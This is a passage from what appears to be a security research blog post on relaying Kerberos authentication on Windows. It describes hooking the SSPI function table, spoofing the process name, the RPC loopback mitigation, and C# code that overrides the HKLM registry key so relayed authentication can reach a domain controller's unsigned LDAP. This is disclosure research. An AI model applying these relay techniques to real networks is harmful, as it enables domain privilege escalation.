class="c6"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; EOLE_AUTHENTICATION_CAPABILITIES.EOAC_DYNAMIC_CLOAKING,&lt;/span&gt;&lt;/p&gt; &lt;p class="c1"&gt;&lt;span class="c6"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; IntPtr.Zero);&lt;/span&gt;&lt;/p&gt; &lt;p class="c1"&gt;&lt;span class="c6"&gt;}&lt;/span&gt;&lt;/p&gt; &lt;p class="c1"&gt;&lt;span class="c12 c13 c17"&gt;finally&lt;/span&gt;&lt;/p&gt; &lt;p class="c1"&gt;&lt;span class="c6"&gt;{&lt;/span&gt;&lt;/p&gt; &lt;p class="c1"&gt;&lt;span class="c6"&gt;&amp;nbsp; &amp;nbsp; SetProcessModuleName(str);&lt;/span&gt;&lt;/p&gt; &lt;p class="c1"&gt;&lt;span class="c12"&gt;}&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;&lt;/table&gt; &lt;p class="c0"&gt;&lt;span class="c9"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="c5"&gt;&lt;span&gt;In the above code, we register to only receive Kerberos authentication and we can also specify an arbitrary SPN as I described in the &lt;/span&gt;&lt;span class="c2"&gt;&lt;a class="c211" href="https://googleprojectzero.blogspot.com/2021/10/using-kerberos-for-authentication-relay.html"&gt;previous blog post&lt;/a&gt;&lt;/span&gt;&lt;span&gt;. One thing to note is that the call to &lt;/span&gt;&lt;span class="c4"&gt;CoInitializeSecurity&lt;/span&gt;&lt;span class="c9"&gt;&amp;nbsp;will establish the connection to RPCSS and pass the executable filename. Therefore we need to modify the filename before calling the API as we can&amp;#39;t change it after the connection has been established. &lt;/span&gt;&lt;/p&gt; &lt;p class="c0"&gt;&lt;span class="c9"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="c5"&gt;&lt;span&gt;For &lt;/span&gt;&lt;span&gt;swag&lt;/span&gt;&lt;span&gt;&amp;nbsp;points I specify the filename &lt;/span&gt;&lt;span class="c4"&gt;System&lt;/span&gt;&lt;span&gt;&amp;nbsp;rather than build the full path to &lt;/span&gt;&lt;span class="c4"&gt;svchost.exe&lt;/span&gt;&lt;span&gt;. This is the &lt;/span&gt;&lt;span&gt;name assigned to the kernel which is also granted access through the firewall. We restore the original filename after the call to &lt;/span&gt;&lt;span class="c4"&gt;CoInitializeSecurity &lt;/span&gt;&lt;span class="c9"&gt;to reduce the risk of it breaking something unexpectedly.&lt;/span&gt;&lt;/p&gt; &lt;p class="c0"&gt;&lt;span class="c9"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="c5"&gt;&lt;span class="c9"&gt;That covers the selection of the authentication service to use, but doesn&amp;#39;t help us actually capture that authentication. My first thought to capture the authentication was to find the socket handle for the TCP server, close it and create a new socket in its place. Then I could directly process the RPC protocol and parse out the authentication. This felt somewhat risky as the RPC runtime would still think it has a valid TCP server socket and might fail in unexpected ways. Also it felt like a lot of work, when I have a perfectly good RPC protocol parser built into Windows.&lt;/span&gt;&lt;/p&gt; &lt;p class="c0"&gt;&lt;span class="c9"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="c5"&gt;&lt;span&gt;I then resigned myself to hooking the SSPI APIs, although ideally I&amp;#39;d prefer not to do so. However, once I started looking at the RPC runtime library there weren&amp;#39;t any imports for the SSPI APIs to hook into and I really didn&amp;#39;t want to patch the functions themselves. It turns out that the RPC runtime loads security packages dynamically, based on the authentication service requested and the configuration of the &lt;/span&gt;&lt;span class="c4"&gt;HKLM\SOFTWARE\Microsoft\Rpc\SecurityService&lt;/span&gt;&lt;span class="c9"&gt;&amp;nbsp;registry key.&lt;/span&gt;&lt;/p&gt; &lt;p class="c0"&gt;&lt;span class="c9"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="c5"&gt;&lt;/p&gt; &lt;p class="c5"&gt;&lt;span class="c4"&gt;&lt;a href="https://blogger.googleusercontent.com/img/a/AVvXsEjut3GRmorvSSNNaDpQRqrl_iUdQjSqTr06r3s_12lQDzVtIi7OJwINWgBRmv8as_BRNre-etpbRUDFZPEldHiPlRP38MGb3CrYQvR2rebglfqQvCGTrrUEE2H-drttDe-J6V-8RXHfLaf-VESlwmEA66UHT6seXSmSvzBN2w4nBKFYTgpz_IjQL7XLDA=s877" style="display: block; padding: 1em 0;text-align: center;"&gt;&lt;img src="https://blogger.googleusercontent.com/img/a/AVvXsEjut3GRmorvSSNNaDpQRqrl_iUdQjSqTr06r3s_12lQDzVtIi7OJwINWgBRmv8as_BRNre-etpbRUDFZPEldHiPlRP38MGb3CrYQvR2rebglfqQvCGTrrUEE2H-drttDe-J6V-8RXHfLaf-VESlwmEA66UHT6seXSmSvzBN2w4nBKFYTgpz_IjQL7XLDA=s877" border="0" alt="Screenshot of the Registry Editor showing HKLM\SOFTWARE\Microsoft\Rpc\SecurityService key" style="max-height: 750px; max-width: 600px;" /&gt;&lt;/a&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="c0"&gt;&lt;span class="c9"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="c5"&gt;&lt;span&gt;The key, shown in the above screenshot has a list of values. The value&amp;#39;s name is the number &lt;/span&gt;&lt;span class="c2"&gt;&lt;a class="c211" href="https://docs.microsoft.com/en-us/windows/win32/com/com-authentication-service-constants"&gt;assigned&lt;/a&gt;&lt;/span&gt;&lt;span&gt;&amp;nbsp;to the authentication service, for example 16 is &lt;/span&gt;&lt;span class="c4"&gt;RPC_C_AUTHN_GSS_KERBEROS&lt;/span&gt;&lt;span&gt;. The value&amp;#39;s data is then the name of the DLL to load which provides the API, for Kerberos this is &lt;/span&gt;&lt;span class="c4"&gt;sspicli.dll&lt;/span&gt;&lt;span class="c9"&gt;.&lt;/span&gt;&lt;/p&gt; &lt;p class="c0"&gt;&lt;span class="c9"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="c5"&gt;&lt;span&gt;The RPC runtime then loads a table of security functions from the DLL by calling its exported &lt;/span&gt;&lt;span class="c2"&gt;&lt;a class="c211" href="https://docs.microsoft.com/en-us/windows/win32/api/sspi/nf-sspi-initsecurityinterfacew"&gt;InitSecurityInterface&lt;/a&gt;&lt;/span&gt;&lt;span&gt;&amp;nbsp;method. At least for &lt;/span&gt;&lt;span class="c4"&gt;sspicli&lt;/span&gt;&lt;span&gt;&amp;nbsp;the table is always the same and is a pre-initialized structure in the DLL&amp;#39;s data section. This is perfect, we can just call &lt;/span&gt;&lt;span class="c4"&gt;InitSecurityInterface&lt;/span&gt;&lt;span class="c9"&gt;&amp;nbsp;before the RPC runtime is initialized to get a pointer to the table then modify its function pointers to point to our own implementation of the API. As an added bonus the table is in a writable section of the DLL so we don&amp;#39;t even need to modify the memory protection.&lt;/span&gt;&lt;/p&gt; &lt;p class="c0"&gt;&lt;span class="c9"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="c5"&gt;&lt;span&gt;Of course implementing the hooks is non-trivial. This is made more complex because RPC uses the &lt;/span&gt;&lt;span class="c2"&gt;&lt;a class="c211" href="https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-kile/190ab8de-dc42-49cf-bf1b-ea5705b7a087"&gt;DCE style Kerberos authentication&lt;/a&gt;&lt;/span&gt;&lt;span class="c9"&gt;&amp;nbsp;which requires two tokens from the client before the server considers the authentication complete. This requires maintaining more state to keep the RPC server and client implementations happy. I&amp;#39;ll leave this as an exercise for the reader.&lt;/span&gt;&lt;/p&gt;&lt;h2 class="c23" id="h.dkczv6jimbo9"&gt;&lt;span class="c25 c17"&gt;Choosing a Relay Target Service&lt;/span&gt;&lt;/h2&gt; &lt;p class="c5"&gt;&lt;span&gt;The next step is to choose a suitable target service to relay the authentication to. For &lt;/span&gt;&lt;span class="c2"&gt;&lt;a class="c211" href="https://bugs.chromium.org/p/project-zero/issues/detail?id=325"&gt;issue 325&lt;/a&gt;&lt;/span&gt;&lt;span class="c9"&gt;&amp;nbsp;I relayed the authentication to the same machine&amp;#39;s DCOM activator RPC service and was able to achieve an arbitrary file write.&lt;/span&gt;&lt;/p&gt; &lt;p class="c0"&gt;&lt;span class="c9"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="c5"&gt;&lt;span&gt;I thought that maybe I could do so again, so I modified my &lt;/span&gt;&lt;span class="c2"&gt;&lt;a class="c211" href="https://googleprojectzero.blogspot.com/2019/12/calling-local-windows-rpc-servers-from.html"&gt;.NET RPC client&lt;/a&gt;&lt;/span&gt;&lt;span class="c9"&gt;&amp;nbsp;to handle the relayed authentication and tried accessing local RPC services. No matter what RPC server or function I called, I always got an access denied error. Even if I wrote my own RPC server which didn&amp;#39;t have any checks, it would fail.&lt;/span&gt;&lt;/p&gt; &lt;p class="c0"&gt;&lt;span class="c9"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="c5"&gt;&lt;span class="c9"&gt;Digging into the failure it turned out that at some point (I don&amp;#39;t know specifically when), Microsoft added a mitigation into the RPC runtime to make it very difficult to relay authentication back to the same system. &lt;/span&gt;&lt;/p&gt; &lt;p class="c0"&gt;&lt;span class="c9"&gt;&lt;/span&gt;&lt;/p&gt;&lt;a id="t.d16597b280dba3c3840bf804233cdcf3fbce3cb7"&gt;&lt;/a&gt;&lt;a id="t.8"&gt;&lt;/a&gt;&lt;table class="c20"&gt;&lt;tbody&gt;&lt;tr class="c26"&gt;&lt;td class="c31" colspan="1" rowspan="1"&gt; &lt;p class="c1"&gt;&lt;span class="c10"&gt;void&lt;/span&gt;&lt;span class="c11"&gt;&amp;nbsp;SSECURITY_CONTEXT&lt;/span&gt;&lt;span class="c3"&gt;::&lt;/span&gt;&lt;span class="c11"&gt;ValidateUpgradeCriteria&lt;/span&gt;&lt;span class="c3 c17"&gt;() {&lt;/span&gt;&lt;/p&gt; &lt;p class="c1"&gt;&lt;span class="c11"&gt;&amp;nbsp; &lt;/span&gt;&lt;span class="c16 c13"&gt;if&lt;/span&gt;&lt;span class="c11"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class="c3"&gt;(&lt;/span&gt;&lt;span class="c16 c13"&gt;this&lt;/span&gt;&lt;span class="c3"&gt;-&amp;gt;&lt;/span&gt;&lt;span class="c11"&gt;AuthnLevel &lt;/span&gt;&lt;span class="c3"&gt;&amp;lt;&lt;/span&gt;&lt;span class="c11"&gt;&amp;nbsp;RPC_C_AUTHN_LEVEL_PKT_INTEGRITY&lt;/span&gt;&lt;span class="c3 c17"&gt;) {&lt;/span&gt;&lt;/p&gt; &lt;p class="c1"&gt;&lt;span class="c11"&gt;&amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class="c16 c13"&gt;if&lt;/span&gt;&lt;span class="c11"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class="c3"&gt;(&lt;/span&gt;&lt;span class="c11"&gt;IsLoopback&lt;/span&gt;&lt;span class="c3 c17"&gt;())&lt;/span&gt;&lt;/p&gt; &lt;p class="c1"&gt;&lt;span class="c11"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class="c16 c13"&gt;this&lt;/span&gt;&lt;span class="c3"&gt;-&amp;gt;&lt;/span&gt;&lt;span class="c11"&gt;UnsafeLoopbackAuth &lt;/span&gt;&lt;span class="c3"&gt;=&lt;/span&gt;&lt;span class="c11"&gt;&amp;nbsp;TRUE&lt;/span&gt;&lt;span class="c3 c17"&gt;;&lt;/span&gt;&lt;/p&gt; &lt;p class="c1"&gt;&lt;span class="c11"&gt;&amp;nbsp; &lt;/span&gt;&lt;span class="c3 c17"&gt;}&lt;/span&gt;&lt;/p&gt; &lt;p class="c1"&gt;&lt;span class="c3"&gt;}&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;&lt;/table&gt; &lt;p class="c0"&gt;&lt;span class="c9"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="c5"&gt;&lt;span&gt;The &lt;/span&gt;&lt;span class="c4"&gt;SSECURITY_CONTEXT::ValidateUpgradeCriteria&lt;/span&gt;&lt;span&gt;&amp;nbsp;method is called when receiving RPC authentication packets. If the authentication level for the RPC connection is less than &lt;/span&gt;&lt;span class="c4"&gt;RPC_C_AUTHN_LEVEL_PKT_INTEGRITY&lt;/span&gt;&lt;span&gt;&amp;nbsp;such as &lt;/span&gt;&lt;span class="c4"&gt;RPC_C_AUTHN_LEVEL_PKT_CONNECT&lt;/span&gt;&lt;span&gt;&amp;nbsp;and the authentication was from the same system then a flag is set to true in the security context. The &lt;/span&gt;&lt;span class="c4"&gt;IsLoopback &lt;/span&gt;&lt;span&gt;function calls the &lt;/span&gt;&lt;span class="c2"&gt;&lt;a class="c211" href="https://docs.microsoft.com/en-us/windows/win32/secauthn/querycontextattributes--general"&gt;QueryContextAttributes&lt;/a&gt;&lt;/span&gt;&lt;span&gt;&amp;nbsp;API for the undocumented &lt;/span&gt;&lt;span class="c4"&gt;SECPKG_ATTR_IS_LOOPBACK&lt;/span&gt;&lt;span class="c9"&gt;&amp;nbsp;attribute value from the server security context. This attribute indicates if the authentication was from the local system.&lt;/span&gt;&lt;/p&gt; &lt;p class="c0"&gt;&lt;span class="c9"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="c5"&gt;&lt;span&gt;When an RPC call is made the server will check if the flag is true, if it is then the call will be immediately rejected before any code is called in the server including the RPC interface&amp;#39;s security callback. The only way to pass this check is either the authentication doesn&amp;#39;t come from the local system or the authentication level is &lt;/span&gt;&lt;span class="c4"&gt;RPC_C_AUTHN_LEVEL_PKT_INTEGRITY&lt;/span&gt;&lt;span class="c9"&gt;&amp;nbsp;or above which then requires the client to know the session key for signing or encryption. The RPC client will also check for local authentication and will increase the authentication level if necessary. This is an effective way of preventing the relay of local authentication to elevate privileges.&lt;/span&gt;&lt;/p&gt; &lt;p class="c0"&gt;&lt;span class="c9"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="c5"&gt;&lt;span class="c9"&gt;Instead as I was focussing on Kerberos, I came to the conclusion that relaying the authentication to an enterprise network service was more useful. As the default settings for a domain controller&amp;#39;s LDAP service still do not enforce signing, it would seem a reasonable target. As we&amp;#39;ll see, this provides a limitation of the source of the authentication, as it must not enable Integrity otherwise the LDAP server will enforce signing.&lt;/span&gt;&lt;/p&gt; &lt;p class="c0"&gt;&lt;span class="c9"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="c5"&gt;&lt;span&gt;The problem with LDAP is I didn&amp;#39;t have any code which implemented the protocol. I&amp;#39;m sure there is some .NET code to do it somewhere, but the fewer dependencies I have the better. As I mentioned in the &lt;/span&gt;&lt;span class="c2"&gt;&lt;a class="c211" href="https://googleprojectzero.blogspot.com/2021/10/using-kerberos-for-authentication-relay.html"&gt;previous blog post&lt;/a&gt;&lt;/span&gt;&lt;span&gt;, Windows has a builtin &lt;/span&gt;&lt;span class="c2"&gt;&lt;a class="c211" href="https://docs.microsoft.com/en-us/windows/win32/api/_ldap/"&gt;LDAP library&lt;/a&gt;&lt;/span&gt;&lt;span&gt;&amp;nbsp;in &lt;/span&gt;&lt;span class="c4"&gt;wldap32.dll&lt;/span&gt;&lt;span class="c9"&gt;. Could I repurpose its API but convert it into using relayed authentication?&lt;/span&gt;&lt;/p&gt; &lt;p class="c0"&gt;&lt;span class="c9"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="c5"&gt;&lt;span&gt;Unsurprisingly the library doesn&amp;#39;t have a &amp;quot;Enable relayed authentication&amp;quot; mode, but after a few minutes in a disassembler, it was clear it was also delay-loading the SSPI interfaces through the &lt;/span&gt;&lt;span class="c4"&gt;InitSecurityInterface &lt;/span&gt;&lt;span&gt;method. I could repurpose my code for capturing the authentication for relaying the authentication. There was initially a minor issue, accidentally or on purpose there was a stray call to &lt;/span&gt;&lt;span class="c4"&gt;QueryContextAttributes&lt;/span&gt;&lt;span class="c4"&gt;&amp;nbsp;&lt;/span&gt;&lt;span&gt;which was directly imported, so I needed to patch that through an &lt;/span&gt;&lt;span class="c4"&gt;Import Address Table (IAT)&lt;/span&gt;&lt;span class="c9"&gt;&amp;nbsp;hook as distasteful as that was.&lt;/span&gt;&lt;/p&gt; &lt;p class="c0"&gt;&lt;span class="c9"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="c5"&gt;&lt;span&gt;There was still a problem however. When the client connects it always tries to enable LDAP signing, as we are relaying authentication with no access to the session key this causes the connection to fail. Setting the option value &lt;/span&gt;&lt;span class="c4"&gt;LDAP_OPT_SIGN&lt;/span&gt;&lt;span&gt;&amp;nbsp;in the library to false didn&amp;#39;t change this behavior. I needed to set the &lt;/span&gt;&lt;span class="c4"&gt;LdapClientIntegrity &lt;/span&gt;&lt;span&gt;registry value to 0 in the LDAP service&amp;#39;s key before initializing the library. Unfortunately that key is only modifiable by administrators. I could have modified the library itself, but as it was checking the key during &lt;/span&gt;&lt;span class="c4"&gt;DllMain &lt;/span&gt;&lt;span class="c9"&gt;it would be a complex dance to patch the DLL in the middle of loading.&lt;/span&gt;&lt;/p&gt; &lt;p class="c0"&gt;&lt;span class="c9"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="c5"&gt;&lt;span&gt;Instead I decided to override the &lt;/span&gt;&lt;span class="c4"&gt;HKEY_LOCAL_MACHINE&lt;/span&gt;&lt;span&gt;&amp;nbsp;key. This is possible for the Win32 APIs by using the &lt;/span&gt;&lt;span class="c2"&gt;&lt;a class="c211" href="https://docs.microsoft.com/en-us/windows/win32/api/winreg/nf-winreg-regoverridepredefkey"&gt;RegOverridePredefKey&lt;/a&gt;&lt;/span&gt;&lt;span&gt;&amp;nbsp;API. The purpose of the API is to allow installers to redirect administrator-only modifications to the registry into a writable location, however for our purposes we can also use it to redirect the reading of the &lt;/span&gt;&lt;span class="c4"&gt;LdapClientIntegrity &lt;/span&gt;&lt;span class="c9"&gt;registry value.&lt;/span&gt;&lt;/p&gt; &lt;p class="c0"&gt;&lt;span class="c9"&gt;&lt;/span&gt;&lt;/p&gt;&lt;a id="t.701cb52d2a1d8adec608337c8e749b549cee1cf3"&gt;&lt;/a&gt;&lt;a id="t.9"&gt;&lt;/a&gt;&lt;table class="c20"&gt;&lt;tbody&gt;&lt;tr class="c26"&gt;&lt;td class="c31" colspan="1" rowspan="1"&gt; &lt;p class="c1"&gt;&lt;span class="c12"&gt;[DllImport(&lt;/span&gt;&lt;span class="c12 c27"&gt;&amp;quot;Advapi32.dll&amp;quot;&lt;/span&gt;&lt;span class="c6"&gt;)]&lt;/span&gt;&lt;/p&gt; &lt;p class="c1"&gt;&lt;span class="c12 c13"&gt;static&lt;/span&gt;&lt;span class="c12"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class="c12 c13"&gt;extern&lt;/span&gt;&lt;span class="c12"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class="c12 c13"&gt;int&lt;/span&gt;&lt;span class="c6"&gt;&amp;nbsp;RegOverridePredefKey(&lt;/span&gt;&lt;/p&gt; &lt;p class="c1"&gt;&lt;span class="c6"&gt;&amp;nbsp; &amp;nbsp; IntPtr hKey,&lt;/span&gt;&lt;/p&gt; &lt;p class="c1"&gt;&lt;span class="c6"&gt;&amp;nbsp; &amp;nbsp; IntPtr hNewHKey&lt;/span&gt;&lt;/p&gt; &lt;p class="c1"&gt;&lt;span class="c6"&gt;);&lt;/span&gt;&lt;/p&gt; &lt;p class="c1 c19"&gt;&lt;span class="c6"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="c1"&gt;&lt;span class="c12"&gt;[DllImport(&lt;/span&gt;&lt;span class="c12 c27"&gt;&amp;quot;kernel32.dll&amp;quot;&lt;/span&gt;&lt;span class="c12"&gt;, CharSet = CharSet.Unicode, SetLastError = &lt;/span&gt;&lt;span class="c12 c13"&gt;true&lt;/span&gt;&lt;span class="c6"&gt;)]&lt;/span&gt;&lt;/p&gt; &lt;p class="c1"&gt;&lt;span class="c12 c13"&gt;static&lt;/span&gt;&lt;span class="c12"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class="c12 c13"&gt;extern&lt;/span&gt;&lt;span class="c12"&gt;&amp;nbsp;IntPtr LoadLibrary(&lt;/span&gt;&lt;span class="c12 c13"&gt;string&lt;/span&gt;&lt;span class="c6"&gt;&amp;nbsp;libname);&lt;/span&gt;&lt;/p&gt; &lt;p class="c1 c19"&gt;&lt;span class="c6"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="c1"&gt;&lt;span class="c12 c13"&gt;static&lt;/span&gt;&lt;span class="c12"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class="c12 c13"&gt;readonly&lt;/span&gt;&lt;span class="c12"&gt;&amp;nbsp;IntPtr HKEY_LOCAL_MACHINE = &lt;/span&gt;&lt;span class="c12 c13"&gt;new&lt;/span&gt;&lt;span class="c6"&gt;&amp;nbsp;IntPtr(-2147483646);&lt;/span&gt;&lt;/p&gt; &lt;p class="c1 c19"&gt;&lt;span class="c6"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="c1"&gt;&lt;span class="c12 c13"&gt;static&lt;/span&gt;&lt;span class="c12"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class="c12 c13"&gt;void&lt;/span&gt;&lt;span class="c6"&gt;&amp;nbsp;OverrideLocalMachine(RegistryKey key)&lt;/span&gt;&lt;/p&gt; &lt;p class="c1"&gt;&lt;span class="c6"&gt;{&lt;/span&gt;&lt;/p&gt; &lt;p class="c1"&gt;&lt;span class="c12"&gt;&amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class="c12 c13"&gt;int&lt;/span&gt;&lt;span class="c6"&gt;&amp;nbsp;res = RegOverridePredefKey(HKEY_LOCAL_MACHINE, &lt;/span&gt;&lt;/p&gt; &lt;p class="c1"&gt;&lt;span class="c6"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; key?.Handle.DangerousGetHandle() ?? IntPtr.Zero);&lt;/span&gt;&lt;/p&gt; &lt;p class="c1"&gt;&lt;span class="c12"&gt;&amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class="c12 c13"&gt;if&lt;/span&gt;&lt;span class="c6"&gt;&amp;nbsp;(res != 0)&lt;/span&gt;&lt;/p&gt; &lt;p class="c1"&gt;&lt;span class="c12"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class="c12 c13"&gt;throw&lt;/span&gt;&lt;span class="c12"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class="c12 c13"&gt;new&lt;/span&gt;&lt;span class="c6"&gt;&amp;nbsp;Win32Exception(res);&lt;/span&gt;&lt;/p&gt; &lt;p class="c1"&gt;&lt;span class="c6"&gt;}&lt;/span&gt;&lt;/p&gt; &lt;p class="c1 c19"&gt;&lt;span class="c6"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="c1"&gt;&lt;span class="c12 c13"&gt;static&lt;/span&gt;&lt;span class="c12"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class="c12 c13"&gt;void&lt;/span&gt;&lt;span class="c6"&gt;&amp;nbsp;LoadLDAPLibrary()&lt;/span&gt;&lt;/p&gt; &lt;p class="c1"&gt;&lt;span class="c6"&gt;{&lt;/span&gt;&lt;/p&gt; &lt;p class="c1"&gt;&lt;span class="c12"&gt;&amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class="c12 c13"&gt;string&lt;/span&gt;&lt;span class="c12"&gt;&amp;nbsp;dummy = &lt;/span&gt;&lt;span class="c12 c15"&gt;@&amp;quot;SOFTWARE\DUMMY&amp;quot;&lt;/span&gt;&lt;span class="c6"&gt;;&lt;/span&gt;&lt;/p&gt; &lt;p class="c1"&gt;&lt;span class="c12"&gt;&amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class="c12 c13"&gt;string&lt;/span&gt;&lt;span class="c12"&gt;&amp;nbsp;target = &lt;/span&gt;&lt;span class="c12 c15"&gt;@&amp;quot;System\CurrentControlSet\Services\LDAP&amp;quot;&lt;/span&gt;&lt;span class="c6"&gt;;&lt;/span&gt;&lt;/p&gt; &lt;p class="c1"&gt;&lt;span class="c12"&gt;&amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class="c12 c13"&gt;using&lt;/span&gt;&lt;span class="c12"&gt;&amp;nbsp;(&lt;/span&gt;&lt;span class="c12 c13"&gt;var&lt;/span&gt;&lt;span class="c12"&gt;&amp;nbsp;key = Registry.CurrentUser.CreateSubKey(dummy, &lt;/span&gt;&lt;span class="c12 c13"&gt;true&lt;/span&gt;&lt;span class="c6"&gt;))&lt;/span&gt;&lt;/p&gt; &lt;p class="c1"&gt;&lt;span class="c6"&gt;&amp;nbsp; &amp;nbsp; {&lt;/span&gt;&lt;/p&gt; &lt;p class="c1"&gt;&lt;span class="c12"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class="c12 c13"&gt;using&lt;/span&gt;&lt;span class="c12"&gt;&amp;nbsp;(&lt;/span&gt;&lt;span class="c12 c13"&gt;var&lt;/span&gt;&lt;span class="c12"&gt;&amp;nbsp;okey = key.CreateSubKey(target, &lt;/span&gt;&lt;span class="c12 c13"&gt;true&lt;/span&gt;&lt;span class="c6"&gt;))&lt;/span&gt;&lt;/p&gt; &lt;p class="c1"&gt;&lt;span class="c6"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; {&lt;/span&gt;&lt;/p&gt; &lt;p class="c1"&gt;&lt;span class="c12"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; okey.SetValue(&lt;/span&gt;&lt;span class="c12 c27"&gt;&amp;quot;LdapClientIntegrity&amp;quot;&lt;/span&gt;&lt;span class="c6"&gt;, 0, &lt;/span&gt;&lt;/p&gt; &lt;p class="c1"&gt;&lt;span class="c6"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; RegistryValueKind.DWord);&lt;/span&gt;&lt;/p&gt; &lt;p class="c1"&gt;&lt;span class="c6"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; OverrideLocalMachine(key);&lt;/span&gt;&lt;/p&gt; &lt;p class="c1 c19"&gt;&lt;span class="c6"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="c1"&gt;&lt;span class="c12"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class="c12 c17 c13"&gt;try&lt;/span&gt;&lt;/p&gt; &lt;p class="c1"&gt;&lt;span class="c6"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; {&lt;/span&gt;&lt;/p&gt; &lt;p class="c1"&gt;&lt;span class="c12"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; IntPtr lib = LoadLibrary(&lt;/span&gt;&lt;span class="c12 c27"&gt;&amp;quot;wldap32.dll&amp;quot;&lt;/span&gt;&lt;span class="c6"&gt;);&lt;/span&gt;&lt;/p&gt; &lt;p class="c1"&gt;&lt;span class="c12"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class="c12 c13"&gt;if&lt;/span&gt;&lt;span class="c6"&gt;&amp;nbsp;(lib == IntPtr.Zero)&lt;/span&gt;&lt;/p&gt; &lt;p class="c1"&gt;&lt;span class="c12"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class="c12 c13"&gt;throw&lt;/span&gt;&lt;span class="c12"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class="c12 c13"&gt;new&lt;/span&gt;&lt;span class="c6"&gt;&amp;nbsp;Win32Exception();&lt;/span&gt;&lt;/p&gt; &lt;p class="c1"&gt;&lt;span class="c6"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; }&lt;/span&gt;&lt;/p&gt; &lt;p class="c1"&gt;&lt;span class="c12"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class="c12 c17 c13"&gt;finally&lt;/span&gt;&lt;/p&gt; &lt;p class="c1"&gt;&lt;span class="c6"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; {&lt;/span&gt;&lt;/p&gt; &lt;p class="c1"&gt;&lt;span class="c12"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; OverrideLocalMachine(&lt;/span&gt;&lt;span class="c12 c13"&gt;null&lt;/span&gt;&lt;span class="c6"&gt;);&lt;/span&gt;&lt;/p&gt; &lt;p class="c1"&gt;&lt;span class="c6"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; 